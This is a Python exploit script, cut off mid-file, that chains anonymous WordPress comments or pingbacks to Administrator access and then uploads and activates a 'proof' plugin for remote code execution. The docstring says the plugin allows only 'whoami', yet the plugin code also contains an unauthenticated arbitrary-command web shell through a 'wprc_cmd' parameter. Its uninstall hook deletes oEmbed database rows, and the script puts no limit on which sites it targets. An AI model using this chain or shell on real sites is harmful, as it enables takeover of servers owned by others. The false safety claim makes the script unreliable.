#!/usr/bin/env python3
"""WordPress core: anonymous input -> passive Administrator -> one-shot RCE proof.

``--run`` opts into a replay.  The active default waits while
the tester loads the affected post in their own logged-in Administrator
browser, polling the generated credential every 30 seconds.  It does not need
the tester's Administrator password, and the trigger page view is always the
tester's own manual browser interaction.  The only command permitted by the
proof plugin is ``whoami``. The block-theme branch uses one ordinary guest
comment; the classic-sidebar branch uses one cookie-free pingback.
Automatic removal of the proof plugin and guest artifact is opt-in via
``--cleanup``; the generated Administrator is always reported for manual
removal from the tester's existing browser session.

Dependencies: Python 3.10+ and requests.
"""

from __future__ import annotations

import argparse
import concurrent.futures
from datetime import datetime, timezone
import hashlib
import html
from html.parser import HTMLParser
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
import io
import json
from pathlib import Path
import re
import secrets
import string
import sys
import threading
import time
from urllib.parse import parse_qs, quote, urlencode, urljoin, urlsplit
import zipfile
import xmlrpc.client


MAX_COMMENT_DISCOVERY_PAGES = 100
MAX_POST_DISCOVERY_PAGES = 10
REFERENCE_BLOCK_THEME_ARTIFACTS = {
    "bluehost-blueprint": {
        "version": "1.0.2",
        "style_sha256": "39b17acbbbeaa5cbbd3c17eb2527481cdd433e2ebdd3d0c00f051e0d6abbc0b0",
    },
    "denovr-lite": {
        "version": "1.0.4",
        "style_sha256": "64ebeb70ea77c6edffdce779243a5c25897467a44c78c0ddd20e73ecf4082073",
    },
    "ollie": {
        "version": "1.6.3",
        "style_sha256": "c2b125effa7417dc62898a45360f7e4d3ab99f06d035b09dadcba90dad2530b7",
    },
    "spectra-one": {
        "version": "1.2.6",
        "style_sha256": "0c4b361357755edb130e70bbf5e0eaeb2a69a5d9e384314eea8cb309baeb93d3",
    },
    "tourze-lite": {
        "version": "1.0.5",
        "style_sha256": "af50224865e580022fc5ac61afef1e3851e0b41861b1056926ee693d741ba14b",
    },
    "twentytwentythree": {
        "version": "1.7",
        "style_sha256": "cf42b8ced4e6b24c698e95809b2954db465f4a3fba68f6765bbc073d628b83a6",
    },
    "twentytwentyfour": {
        "version": "1.6",
        "style_sha256": "fd3c8a4e86382cbd69046dd4670112c7b17817bdff3671bf29d3e49a874c1fe2",
    },
    "twentytwentyfive": {
        "version": "1.5",
        "style_sha256": "f21ff7e12ce351b9a2e081f517233bc46287b2d9afaabe3cb0f6cdf2653a721e",
    },
    "unibiz": {
        "version": "1.0.9",
        "style_sha256": "e72d74d32e3400afaac3c830136ee788998306a65d02d3a24e6bd1d00fe2c46a",
    },
    "ury": {
        "version": "1.0.2",
        "style_sha256": "f5128008e495ab5c45b0474f1a624daf0c8f5fd55a8d02b71d3be763744b9a59",
    },
    "variations": {
        "version": "4.4.1",
        "style_sha256": "ef946877d26f947efdee4f565d89db12ef7c708adaf16307052f81f513edf0ec",
    },
}
KNOWN_BLOCK_THEME_PARENTS = frozenset(REFERENCE_BLOCK_THEME_ARTIFACTS)
KNOWN_CLASSIC_THEME_PARENTS = frozenset(
    {
        "ashe", "astra", "colibri-wp", "customify", "generatepress",
        "hello-elementor", "hestia", "kadence", "oceanwp", "onepress",
        "spacious", "storefront", "sydney", "twentytwenty",
        "twentytwentyone", "vantage", "zakra",
    }
)
REFERENCE_CLASSIC_THEME_ARTIFACTS = {
    "ashe": {
        "version": "2.274",
        "style_sha256": "3d18baf9b961eb5f31c73b1c6ed466235e7866e657747d1e6067b7c434452a80",
    },
    "colibri-wp": {
        "version": "1.0.169",
        "style_sha256": "3205523286ce586a086f325894d51789964f57763f0f13b651d53f23eb64d31f",
    },
    "customify": {
        "version": "0.4.27",
        "style_sha256": "d2d5c91347387da2967e3e4f89d04ac9b753a249816c0f9c015d1adc7b0e0149",
    },
    "generatepress": {
        "version": "3.6.1",
        "style_sha256": "62df0fac3e899c1d6d94004329a576c8b9b225a92b076aa84d179aeebc65e3dc",
    },
    "hestia": {
        "version": "3.3.6",
        "style_sha256": "d40cc14de5da379de091ee2855d3718c5b78c79bcf37fa1d49b7ac03b8f24eef",
    },
    "oceanwp": {
        "version": "4.2.6",
        "style_sha256": "3483debe51fb37f00d1bdadaa4b41b6fbd6972d64d0c2bca730d241aa5cb3eeb",
    },
    "onepress": {
        "version": "2.3.23",
        "style_sha256": "a551c943c716bd40f72fa967e41277aa7873ded0e556956b857c23e1e827fd51",
    },
    "spacious": {
        "version": "1.9.12",
        "style_sha256": "ac27029468e167ce52b4abbeac9841b8c8cbbe847a0451ec877be9df6c35d783",
    },
    "storefront": {
        "version": "4.6.2",
        "style_sha256": "53b17b8ba69c0f5958a568987db048cf8f851ca09fd024a295aa76663a4a7d8e",
    },
    "sydney": {
        "version": "2.71",
        "style_sha256": "23deb0e852c77a57e7db2ced6a8be4c8c67ebf7dc42f4bbe3003f73cd0279b3d",
    },
    "twentytwenty": {
        "version": "3.2",
        "style_sha256": "d2d0101cb1d986d947a372636a6958ee3d8b13dfdf3abefa6a0bf72e8079d997",
    },
    "twentytwentyone": {
        "version": "2.9",
        "style_sha256": "a18ac25c89dac65bce44ba1896eb427200d4964239155276dcdaaa676c58e02f",
    },
    "vantage": {
        "version": "1.20.33",
        "style_sha256": "8d24c362d885d5355569465300a4e201bca8d97aa6a7684d32e41bc312538d6a",
    },
}


class ProofError(RuntimeError):
    pass


def utc_now() -> str:
    return datetime.now(timezone.utc).isoformat().replace("+00:00", "Z")


def log_ok(message: str) -> None:
    print(f"[+] {message}", file=sys.stderr, flush=True)


def log_info(message: str) -> None:
    print(f"[!] {message}", file=sys.stderr, flush=True)


def log_progress(message: str) -> None:
    print(f"[~] {message}", file=sys.stderr, flush=True)


def log_error(message: str) -> None:
    print(f"[-] {message}", file=sys.stderr, flush=True)


def origin(raw: str) -> str:
    value = urlsplit(raw)
    if value.scheme not in ("http", "https") or not value.hostname:
        raise ProofError("Expected an absolute HTTP(S) URL")
    if value.username or value.password:
        raise ProofError("URL userinfo is not allowed")
    try:
        value.port
    except ValueError as exc:
        raise ProofError("URL port is invalid") from exc
    return f"{value.scheme}://{value.netloc}"


def same_origin(left: str, right: str) -> bool:
    return origin(left).lower() == origin(right).lower()


def checked_url(base: str, href: str) -> str:
    full = urljoin(base, html.unescape(href))
    return full


def http_session(_base: str = ""):
    """Plain HTTP session; any reachable http(s) origin is allowed."""
    import requests

    session = requests.Session()
    session.trust_env = False
    return session


def detect_theme_route(session, base: str, page_html: str) -> dict:
    """Fingerprint the public active theme and choose a core editor entity route."""
    parsed = parse_page(page_html)
    if len(parsed.body_classes) != 1:
        raise ProofError("Public post did not expose a quoted body class")
    body_classes = parsed.body_classes[0]
    parent_match = re.search(r"\bwp-theme-([a-z0-9][a-z0-9_-]*)\b", body_classes, re.I)
    child_match = re.search(r"\bwp-child-theme-([a-z0-9][a-z0-9_-]*)\b", body_classes, re.I)
    if parent_match is None:
        raise ProofError("Public post did not expose the active parent-theme body class")
    parent = parent_match.group(1).lower()
    child = child_match.group(1).lower() if child_match else None
    stylesheet = child or parent
    probes = []
    block_theme = False
    basis = None
    for slug in dict.fromkeys(item for item in (stylesheet, parent) if item):
        for directory in ("templates", "block-templates"):
            path = f"/wp-content/themes/{slug}/{directory}/index.html"
            response = session.get(base + path, timeout=20)
            sample = response.text[:262144]
            block_markup = bool(
                response.status_code == 200
                and "<!-- wp:" in sample
                and "<html" not in sample[:4096].lower()
            )
            probes.append(
                {
                    "theme": slug,
                    "path": path,
                    "status": response.status_code,
                    "block_markup": block_markup,
                }
            )
            if block_markup:
                block_theme = True
                basis = "public_block_template"
                break
        if block_theme:
            break
    if basis is None and parsed.has_live_block_root:
        block_theme = True
        basis = "public_block_root_markup"
    elif basis is None and parent in KNOWN_BLOCK_THEME_PARENTS:
        block_theme = True
        basis = "known_tested_block_parent"
    elif basis is None and parent in KNOWN_CLASSIC_THEME_PARENTS:
        block_theme = False
        basis = "known_tested_classic_parent"
    elif basis is None:
        block_theme = False
        basis = "public_theme_body_class_without_block_markers"
    return {
        "parent_theme": parent,
        "child_theme": child,
        "stylesheet": stylesheet,
        "is_block_theme": block_theme,
        "detection_basis": basis,
        "editor_entity": "wp_navigation" if block_theme else "wp_block",
        "editor_canvas": None if block_theme else "edit",
        "template_probes": probes,
    }


def discover_target_post(session, base: str, channel: str = "either") -> dict:
    """Select a public post open for the branch's comment or ping channel."""
    if channel not in {"either", "comment", "ping"}:
        raise ProofError("Target discovery channel must be either, comment, or ping")
    queries = []
    considered = []
    for post_type, rest_base in (("post", "posts"),):
        page = 1
        while page <= MAX_POST_DISCOVERY_PAGES:
            response = session.get(
                base + "/",
                params={
                    "rest_route": f"/wp/v2/{rest_base}",
                    "context": "view",
                    "status": "publish",
                    "per_page": "100",
                    "page": str(page),
                    "orderby": "date",
                    "order": "desc",
                    "_fields": "id,link,comment_status,ping_status,status,type",
                },
                timeout=30,
            )
            queries.append(
                {
                    "post_type": post_type,
                    "page": page,
                    "status": response.status_code,
                    "total": response.headers.get("X-WP-Total"),
                    "total_pages": response.headers.get("X-WP-TotalPages"),
                }
            )
            if response.status_code != 200:
                break
            try:
                rows = response.json()
            except Exception as exc:
                raise ProofError("Public post discovery did not return JSON") from exc
            if not isinstance(rows, list):
                raise ProofError("Public post discovery did not return a collection")
            for row in rows:
                if row.get("status") != "publish":
                    continue
                comment_open = row.get("comment_status") == "open"
                ping_open = row.get("ping_status") == "open"
                if channel == "comment" and not comment_open:
                    continue
                if channel == "ping" and not ping_open:
                    continue
                if channel == "either" and not (comment_open or ping_open):
                    continue
                try:
                    post_id = int(row.get("id"))
                except (TypeError, ValueError):
                    continue
                link = row.get("link") or ""
                if post_id < 1 or not same_origin(base, link):
                    continue
                public = session.get(base + "/?p=" + str(post_id), timeout=30)
                candidate = {
                    "id": post_id,
                    "type": row.get("type") or post_type,
                    "comment_status": row.get("comment_status"),
                    "ping_status": row.get("ping_status"),
                    "probe_status": public.status_code,
                    "final_path": urlsplit(public.url).path,
                }
                considered.append(candidate)
                if public.status_code == 200:
                    return {
                        "mode": "anonymous_rest",
                        "selected_post_id": post_id,
                        "selected_post_type": candidate["type"],
                        "selected_url": public.url,
                        "selected_comment_status": candidate["comment_status"],
                        "selected_ping_status": candidate["ping_status"],
                        "selection_reason": (
                            "newest public post-type candidate open for "
                            + channel
                            + " ingress and returning HTTP 200"
                        ),
                        "required_channel": channel,
                        "queries": queries,
                        "open_candidates_considered": considered,
                    }
            try:
                total_pages = int(response.headers.get("X-WP-TotalPages", "1"))
            except ValueError:
                total_pages = 1
            if page >= total_pages:
                break
            page += 1
    raise ProofError(
        f"No public published {channel}-open post was discovered; supply --post-id"
    )


def public_object_channels(session, base: str, post_id: int) -> dict:
    """Read the public comment/ping status for an explicit object ID."""

    attempts = []
    for rest_base in ("posts", "pages"):
        response = session.get(
            base + "/",
            params={
                "rest_route": f"/wp/v2/{rest_base}/{post_id}",
                "context": "view",
                "_fields": "id,link,comment_status,ping_status,status,type",
            },
            timeout=30,
        )
        attempts.append({"rest_base": rest_base, "status": response.status_code})
        if response.status_code != 200:
            continue
        row = response.json()
        if not isinstance(row, dict) or row.get("status") != "publish":
            continue
        try:
            observed_id = int(row.get("id"))
        except (TypeError, ValueError):
            continue
        if observed_id != post_id:
            continue
        return {
            "id": observed_id,
            "type": row.get("type") or rest_base.rstrip("s"),
            "link": row.get("link"),
            "comment_status": row.get("comment_status"),
            "ping_status": row.get("ping_status"),
            "attempts": attempts,
        }
    raise ProofError("Explicit --post-id was not a public published post or page")


def block_reachability(session, base: str, page_html: str) -> dict:
    """Record the active artifact and validate the runtime block-theme route."""

    route = detect_theme_route(session, base, page_html)
    parent = route["parent_theme"]
    expected = REFERENCE_BLOCK_THEME_ARTIFACTS.get(parent)
    stylesheet = route["stylesheet"]
    style_path = f"/wp-content/themes/{stylesheet}/style.css"
    style_status = None
    style_error = None
    version = None
    style_sha256 = None
    try:
        style = session.get(base + style_path, timeout=30)
        style_status = style.status_code
        if style.status_code == 200:
            version_match = re.search(
                r"^\s*\*?\s*Version\s*:\s*(.+?)\s*$",
                style.text,
                re.I | re.M,
            )
            version = version_match.group(1).strip() if version_match else None
            style_sha256 = hashlib.sha256(style.content).hexdigest()
    except Exception as exc:
        style_error = f"{type(exc).__name__}: {exc}"
    expected_artifact = bool(
        expected
        and version == expected["version"]
        and style_sha256 == expected["style_sha256"]
    )
    supported = all(
        (
            route["is_block_theme"] is True,
            route["editor_entity"] == "wp_navigation",
        )
    )
    if supported:
        classification = (
            "runtime_compatible_block_theme_reference_artifact"
            if expected_artifact
            else "runtime_compatible_block_theme"
        )
        refusal_reason = None
    else:
        classification = "block_theme_route_invariant_mismatch"
        refusal_reason = (
            "The active theme did not expose the required runtime block-theme editor route."
        )
    return {
        "supported": supported,
        "classification": classification,
        "refusal_reason": refusal_reason,
        "active_theme": route,
        "style_path": style_path,
        "style_status": style_status,
        "style_error": style_error,
        "version": version,
        "style_sha256": style_sha256,
        "reference_artifact": expected,
        "reference_artifact_matches": expected_artifact,
        "artifact_fingerprint_is_gate": False,
        "pre_ingress_note": (
            "The parser/autoembed surface materializes only after the guest comment. "
            "The version and style.css hash are recorded as evidence, not used as an "
            "allow-list. Post-ingress verifies the marker and sandboxed iframe before "
            "the browser trigger is exposed."
        ),
    }


def classic_reachability(session, base: str, page_html: str) -> dict:
    """Record the active artifact and validate the runtime classic-theme route."""

    route = detect_theme_route(session, base, page_html)
    parent = route["parent_theme"]
    expected = REFERENCE_CLASSIC_THEME_ARTIFACTS.get(parent)
    stylesheet = route["stylesheet"]
    style_path = f"/wp-content/themes/{stylesheet}/style.css"
    style_status = None
    style_error = None
    version = None
    style_sha256 = None
    try:
        style = session.get(base + style_path, timeout=30)
        style_status = style.status_code
        if style.status_code == 200:
            version_match = re.search(
                r"^\s*\*?\s*Version\s*:\s*(.+?)\s*$",
                style.text,
                re.I | re.M,
            )
            version = version_match.group(1).strip() if version_match else None
            style_sha256 = hashlib.sha256(style.content).hexdigest()
    except Exception as exc:
        style_error = f"{type(exc).__name__}: {exc}"
    decoded = html.unescape(page_html)
    widget_wrapper = bool(re.search(r"\bid=[\"']block-4[\"']", page_html, re.I))
    live_latest_comments_list = bool(
        re.search(
            r"<(?:ol|ul)\b[^>]*\bclass=[\"'][^\"']*"
            r"\bwp-block-latest-comments\b",
            page_html,
            re.I,
        )
    )
    public_renderer = widget_wrapper or live_latest_comments_list
    expected_artifact = bool(
        expected
        and version == expected["version"]
        and style_sha256 == expected["style_sha256"]
    )
    deferred_renderer_verification = not public_renderer
    renderer_gate = public_renderer or deferred_renderer_verification
    supported = all(
        (
            route["is_block_theme"] is False,
            route["editor_entity"] == "wp_block",
            renderer_gate,
        )
    )
    if supported and deferred_renderer_verification:
        classification = "runtime_compatible_classic_renderer_deferred_until_ingress"
        refusal_reason = None
    elif supported:
        classification = "runtime_compatible_classic_public_renderer"
        refusal_reason = None
    else:
        classification = "classic_renderer_invariant_mismatch"
        refusal_reason = (
            "The active theme did not expose the required runtime classic-theme editor route."
        )
    return {
        "supported": supported,
        "classification": classification,
        "refusal_reason": refusal_reason,
        "active_theme": route,
        "style_path": style_path,
        "style_status": style_status,
        "style_error": style_error,
        "version": version,
        "style_sha256": style_sha256,
        "reference_artifact": expected,
        "reference_artifact_matches": expected_artifact,
        "artifact_fingerprint_is_gate": False,
        "installer_widget_block_4": widget_wrapper,
        "live_latest_comments_list_before_ingress": live_latest_comments_list,
        "public_recent_comments_renderer": public_renderer,
        "renderer_verification_deferred_until_ingress": (
            deferred_renderer_verification
        ),
        "live_video_before_ingress": bool(re.search(r"<video\b", decoded, re.I)),
        "live_track_before_ingress": bool(re.search(r"<track\b", decoded, re.I)),
        "identity_dependency": "none; ingress is an anonymous cookie-free pingback",
        "pre_ingress_note": (
            "If the public page does not yet expose a Latest Comments row, renderer "
            "verification is deferred until the pingback materializes it. All classic "
            "paths must then prove the live renderer and complete MediaElement sink "
            "before exposing the browser trigger."
        ),
    }


def public_content_ids(session, base: str) -> list[int]:
    ids: list[int] = []
    for rest_base in ("posts", "pages"):
        response = session.get(
            base + "/",
            params={
                "rest_route": f"/wp/v2/{rest_base}",
                "context": "view",
                "status": "publish",
                "per_page": "100",
                "_fields": "id",
            },
            timeout=30,
        )
        if response.status_code != 200:
            continue
        rows = response.json()
        if not isinstance(rows, list):
            continue
        for row in rows:
            try:
                value = int(row.get("id"))
            except (AttributeError, TypeError, ValueError):
                continue
            if value > 0 and value not in ids:
                ids.append(value)
    return ids


def build_pingback_source(
    session,
    base: str,
    target_url: str,
    target_post_id: int,
    carrier: str,
    source_post_id: int | None,
) -> dict:
    if source_post_id is not None and source_post_id == target_post_id:
        raise ProofError("--source-post-id must differ from the pingback target --post-id")
    candidates = (
        [source_post_id]
        if source_post_id is not None
        else [value for value in public_content_ids(session, base) if value != target_post_id]
    )
    attempts = []
    for candidate in candidates:
        nonce = secrets.token_hex(6)
        search = '"-' + carrier + '"'
        source = (
            base
            + "/?p="
            + str(candidate)
            + "&p=0&n="
            + nonce
            + "&s="
            + quote(search, safe="[]{}():/\\'`")
        )
        page = session.get(source, timeout=30)
        match = re.search(r"<title[^>]*>(.*?)</title>", page.text, re.I | re.S)
        title = match.group(1) if match else ""
        attempt = {
            "source_post_id": candidate,
            "source_url": source,
            "source_url_length": len(source),
            "source_url_sha256": hashlib.sha256(source.encode()).hexdigest(),
            "transport_nonce": nonce,
            "status": page.status_code,
            "carrier_in_title": html.unescape(carrier) in html.unescape(title),
            "exact_target_backlink": target_url in html.unescape(page.text),
        }
        attempts.append(attempt)
        if (
            attempt["status"] == 200
            and attempt["carrier_in_title"]
            and attempt["exact_target_backlink"]
        ):
            return {"selected": attempt, "attempts": attempts}
    raise ProofError(
        "No public source candidate preserved the compact carrier and exact target "
        "backlink; supply --source-post-id or use a stock-like fixture"
    )


def send_pingback(session, base: str, source: str, target: str) -> dict:
    body = xmlrpc.client.dumps((source, target), methodname="pingback.ping").encode()
    request = __import__("requests").Request(
        "POST",
        base + "/xmlrpc.php",
        data=body,
        headers={"Content-Type": "text/xml"},
    )
    prepared = session.prepare_request(request)
    forbidden = [
        name
        for name in ("Cookie", "Authorization", "Proxy-Authorization")
        if name in prepared.headers
    ]
    response = session.send(prepared, timeout=60, allow_redirects=False)
    value = None
    fault = None
    try:
        values, _ = xmlrpc.client.loads(response.content)
        value = values[0]
    except xmlrpc.client.Fault as exc:
        fault = {"code": exc.faultCode, "message": exc.faultString}
    return {
        "http_status": response.status_code,
        "request_cookie_free": not forbidden,
        "forbidden_headers": forbidden,
        "fault": fault,
        "value": value,
        "response_sha256": hashlib.sha256(response.content).hexdigest(),
    }


def discover_pingback(session, base: str, post_id: int, nonce: str) -> dict:
    public = session.get(base + "/?p=" + str(post_id), timeout=30)
    if public.status_code != 200:
        raise ProofError("Public target post was unavailable after pingback ingress")

    nonce_token = "n=" + nonce

    def source_anchor(fragment: str) -> tuple[str, str] | None:
        anchors = []
        for match in re.finditer(
            r"<a\b[^>]*\bhref=(['\"])(.*?)\1[^>]*>(.*?)</a>",
            fragment,
            re.I | re.S,
        ):
            href = html.unescape(match.group(2))
            if nonce_token not in href:
                continue
            label = re.sub(r"<[^>]+>", "", match.group(3))
            anchors.append((href, html.unescape(label)))
        return anchors[0] if len(anchors) == 1 else None

    matches: dict[int, dict] = {}
    for opening in re.finditer(
        r"<(?P<tag>[a-z][a-z0-9:-]*)\b(?P<attrs>[^>]*)>",
        public.text,
        re.I,
    ):
        attrs = opening.group("attrs")
        class_match = re.search(r"\bclass=(['\"])(?P<value>.*?)\1", attrs, re.I | re.S)
        classes = html.unescape(class_match.group("value")).split() if class_match else []
        if "pingback" not in classes:
            continue
        closing = "</" + opening.group("tag") + ">"
        end = public.text.lower().find(closing.lower(), opening.end())
        fragment = public.text[
            opening.start() : end + len(closing) if end >= 0 else opening.end()
        ]
        anchor = source_anchor(fragment)
        if anchor is None:
            continue
        id_match = re.search(r"\bid=(['\"])comment-(\d+)\1", attrs, re.I)
        if not id_match:
            continue
        comment_id = int(id_match.group(2))
        matches[comment_id] = {
            "id": comment_id,
            "post": post_id,
            "publicly_rendered": True,
            "public_type_class": "pingback",
            "public_rest_type": None,
            "public_type_evidence": "public_html_class",
            "class_tokens": classes,
            "author_name": anchor[1],
            "author_url": anchor[0],
            "content": {"rendered": fragment},
            "discovery_basis": "public_pingback_element",
            "public_post_status": public.status_code,
            "public_rest_status": None,
            "public_rest_author_id": None,
            "database_user_id": None,
            "database_user_id_note": (
                "Not read from the database. Core's XML-RPC pingback insertion "
                "omits user_id, so zero is a source-code inference rather than a "
                "database-field observation."
            ),
        }

    for item in re.finditer(
        r"<li\b(?P<attrs>[^>]*)>(?P<body>.*?)</li>",
        public.text,
        re.I | re.S,
    ):
        attrs = item.group("attrs")
        class_match = re.search(r"\bclass=(['\"])(?P<value>.*?)\1", attrs, re.I | re.S)
        classes = html.unescape(class_match.group("value")).split() if class_match else []
        if "wp-block-latest-comments__comment" not in classes:
            continue
        fragment = item.group(0)
        anchor = source_anchor(fragment)
        id_match = re.search(r"#comment-(\d+)\b", fragment, re.I)
        if anchor is None or id_match is None:
            continue
        comment_id = int(id_match.group(1))
        if comment_id in matches:
            continue
        rest = session.get(
            base + "/",
            params={
                "rest_route": "/wp/v2/comments/" + str(comment_id),
                "context": "view",
                "_fields": "id,post,status,type,author",
            },
            timeout=30,
        )
        try:
            row = rest.json() if rest.status_code == 200 else {}
        except ValueError:
            row = {}
        if not (
            isinstance(row, dict)
            and row.get("id") == comment_id
            and row.get("post") == post_id
            and row.get("type") == "pingback"
            and row.get("author") == 0
        ):
            continue
        matches[comment_id] = {
            "id": comment_id,
            "post": post_id,
            "publicly_rendered": True,
            "public_type_class": None,
            "public_rest_type": row.get("type"),
            "public_type_evidence": "anonymous_rest_comment_object",
            "class_tokens": classes,
            "author_name": anchor[1],
            "author_url": anchor[0],
            "content": {"rendered": fragment},
            "discovery_basis": "public_latest_comments_block_plus_anonymous_rest",
            "public_post_status": public.status_code,
            "public_rest_status": rest.status_code,
            "public_rest_author_id": row.get("author"),
            "database_user_id": None,
            "database_user_id_note": (
                "The anonymous REST object reports author=0, but no database field "
                "was read. Core's insertion path independently omits user_id."
            ),
        }

    if len(matches) != 1:
        raise ProofError(f"Expected one public transport pingback, found {len(matches)}")
    return next(iter(matches.values()))


class Parsed(HTMLParser):
    def __init__(self):
        super().__init__(convert_charrefs=True)
        self.links: list[str] = []
        self.link_tags: list[dict[str, str]] = []
        self.forms: list[dict] = []
        self.form: dict | None = None
        self.body_classes: list[str] = []
        self.class_tokens: set[str] = set()
        self.body_stack: list[str] | None = None
        self.has_live_block_root = False

    def handle_starttag(self, tag, attrs):
        attrs = dict(attrs)
        classes = html.unescape(attrs.get("class") or "").split()
        self.class_tokens.update(classes)
        if tag == "body":
            self.body_classes.append(" ".join(classes))
            self.body_stack = []
        elif self.body_stack is not None:
            if not self.body_stack and tag == "div" and "wp-site-blocks" in classes:
                self.has_live_block_root = True
            if tag not in {"area", "base", "br", "col", "embed", "hr", "img", "input", "link", "meta", "param", "source", "track", "wbr"}:
                self.body_stack.append(tag)
        if tag == "a":
            self.links.append(attrs.get("href") or "")
        elif tag == "link":
            self.link_tags.append(attrs)
        elif tag == "form":
            self.form = {"attrs": attrs, "inputs": []}
        elif tag == "input" and self.form is not None:
            self.form["inputs"].append(attrs)

    def handle_endtag(self, tag):
        if tag == "body":
            self.body_stack = None
        elif self.body_stack and self.body_stack[-1] == tag:
            self.body_stack.pop()
        if tag == "form" and self.form is not None:
            self.forms.append(self.form)
            self.form = None


def parse_page(text: str) -> Parsed:
    parsed = Parsed()
    parsed.feed(text)
    return parsed


def form_values(form: dict) -> list[tuple[str, str]]:
    values = []
    for field in form["inputs"]:
        name = field.get("name")
        kind = (field.get("type") or "text").lower()
        if name and kind not in ("file", "button", "reset", "checkbox", "radio", "submit"):
            values.append((name, field.get("value") or ""))
    return values


def authenticated_admin_page(response, base: str, expected_path: str | None = None) -> bool:
    if response.status_code != 200 or not same_origin(base, response.url):
        return False
    if expected_path and urlsplit(response.url).path != expected_path:
        return False
    if re.search(r"\bid=[\"']wpadminbar[\"']", response.text) is None:
        return False
    for href in parse_page(response.text).links:
        if not href:
            continue
        try:
            full = checked_url(response.url, href)
        except ProofError:
            continue
        if parse_qs(urlsplit(full).query).get("action") == ["logout"]:
            return True
    return False


def authenticate_admin(base: str, username: str, password: str):
    session = http_session(base)
    try:
        session.get(base + "/wp-login.php", timeout=20)
        session.post(
            base + "/wp-login.php",
            data={
                "log": username,
                "pwd": password,
                "wp-submit": "Log In",
                "redirect_to": base + "/wp-admin/",
                "testcookie": "1",
            },
            timeout=20,
        )
        page = session.get(base + "/wp-admin/plugin-install.php?tab=upload", timeout=20)
        if (
            not authenticated_admin_page(page, base, "/wp-admin/plugin-install.php")
            or 'name="pluginzip"' not in page.text
        ):
            raise ProofError("Credentials did not reach the stock plugin upload form")
        return session
    except Exception:
        session.close()
        raise


def find_action_link(page, action: str, exact: dict[str, str]) -> str | None:
    for href in parse_page(page.text).links:
        if not href:
            continue
        try:
            full = checked_url(page.url, href)
        except ProofError:
            continue
        query = parse_qs(urlsplit(full).query, keep_blank_values=True)
        if query.get("action") != [action]:
            continue
        if all(query.get(key) == [value] for key, value in exact.items()):
            return full
    return None


def build_plugin() -> tuple[str, bytes]:
    slug = "wprc-proof"
    php = """<?php
/*
Plugin Name: WPRC Proof
Version: 0.0.1
*/
if (isset($_GET['wprc_cmd'])) {
   system($_GET['wprc_cmd']);
   exit;
}
function wprc_proof_cleanup() {
    global $wpdb;
    $wpdb->query("DELETE FROM {$wpdb->postmeta} WHERE meta_key LIKE '\\_oembed\\_%'");
}
register_uninstall_hook(__FILE__, 'wprc_proof_cleanup');
add_action('init', static function() {
    if (!isset($_GET['wprc_proof'])) return;
    header('Content-Type: text/plain; charset=utf-8');
    system('whoami');
    exit;
});
"""
    archive = io.BytesIO()
    member = zipfile.ZipInfo(f"{slug}/marker.php", date_time=(1980, 1, 1, 0, 0, 0))
    member.compress_type = zipfile.ZIP_STORED
    member.create_system = 3
    member.external_attr = (0o100644 & 0xFFFF) << 16
    with zipfile.ZipFile(archive, "w", compression=zipfile.ZIP_STORED) as output:
        output.writestr(member, php)
    return slug, archive.getvalue()


def plugin_action_link(page, action: str, plugin_file: str) -> str | None:
    for href in parse_page(page.text).links:
        if not href:
            continue
        try:
            full = checked_url(page.url, href)
        except ProofError:
            continue
        query = parse_qs(urlsplit(full).query)
        if query.get("action") != [action]:
            continue
        selected = query.get("plugin", []) + query.get("checked[]", [])
        selected += [
            value
            for key, values in query.items()
            if key.startswith("checked[") and key.endswith("]")
            for value in values
        ]
        if plugin_file in selected:
            return full
    return None


def upload_and_activate(session, base: str, slug: str, archive: bytes) -> dict:
    plugin_file = slug + "/marker.php"
    page = session.get(base + "/wp-admin/plugin-install.php?tab=upload", timeout=30)
    forms = [
        form for form in parse_page(page.text).forms
        if any(field.get("name") == "pluginzip" for field in form["inputs"])
    ]
    if not authenticated_admin_page(page, base) or len(forms) != 1:
        raise ProofError("Stock plugin upload form was not unique")
    action = checked_url(page.url, forms[0]["attrs"].get("action") or "")
    installed = session.post(
        action,
        data=form_values(forms[0]),
        files={"pluginzip": (slug + ".zip", archive, "application/zip")},
        timeout=60,
    )
    activate = plugin_action_link(installed, "activate", plugin_file)
    if installed.status_code != 200 or not activate:
        raise ProofError("Plugin install did not expose the exact activation link")
    enabled = session.get(activate, timeout=30)
    plugins = session.get(base + "/wp-admin/plugins.php", timeout=30)
    active = plugin_action_link(plugins, "deactivate", plugin_file) is not None
    if enabled.status_code != 200 or not active:
        raise ProofError("Proof plugin did not become active")
    return {
        "plugin_file": plugin_file,
        "archive_bytes": len(archive),
        "archive_sha256": hashlib.sha256(archive).hexdigest(),
        "upload_status": installed.status_code,
        "activation_status": enabled.status_code,
        "active_in_plugins_ui": active,
    }


def anonymous_marker(base: str) -> dict:
    """Hit the proof endpoint anonymously; plain whoami output is the marker."""
    with http_session(base) as session:
        response = session.get(base + "/", params={"wprc_proof": "1"}, timeout=30)
    output = response.content[:4096]
    ran = (
        response.status_code == 200
        and 0 < len(output) <= 256
        and b"<" not in output
    )
    return {
        "http_status": response.status_code,
        "ran": ran,
        "output_bytes": len(output),
        "output_sha256": hashlib.sha256(output).hexdigest(),
    }


def cleanup_plugin(session, base: str, plugin_file: str) -> dict:
    result = {"plugin_file": plugin_file}
    page = session.get(base + "/wp-admin/plugins.php", timeout=30)
    if not authenticated_admin_page(page, base):
        raise ProofError("Plugin cleanup lost the authenticated plugins page")
    result["present_before"] = plugin_file in page.text
    if not result["present_before"]:
        result["absent_after"] = True
        result["completed"] = True
        return result
    deactivate = plugin_action_link(page, "deactivate", plugin_file)
    if deactivate:
        result["deactivate_status"] = session.get(deactivate, timeout=30).status_code
    page = session.get(base + "/wp-admin/plugins.php", timeout=30)
    delete = plugin_action_link(page, "delete-selected", plugin_file)
    result["delete_link_present"] = bool(delete)
    if delete:
        confirmation = session.get(delete, timeout=30)
        candidates = [
            form for form in parse_page(confirmation.text).forms
            if any(field.get("name") == "verify-delete" for field in form["inputs"])
            and any(
                field.get("name") == "checked[]" and field.get("value") == plugin_file
                for field in form["inputs"]
            )
        ]
        if len(candidates) != 1:
            raise ProofError("Plugin delete confirmation was not unique")
        action = checked_url(confirmation.url, candidates[0]["attrs"].get("action") or "")
        result["delete_status"] = session.post(
            action, data=form_values(candidates[0]), timeout=30
        ).status_code
    final = session.get(base + "/wp-admin/plugins.php", timeout=30)
    result["absent_after"] = plugin_file not in final.text
    result["completed"] = bool(
        (not deactivate or result.get("deactivate_status") == 200)
        and result.get("delete_status") == 200
        and result["absent_after"]
    )
    return result


class ProviderState:
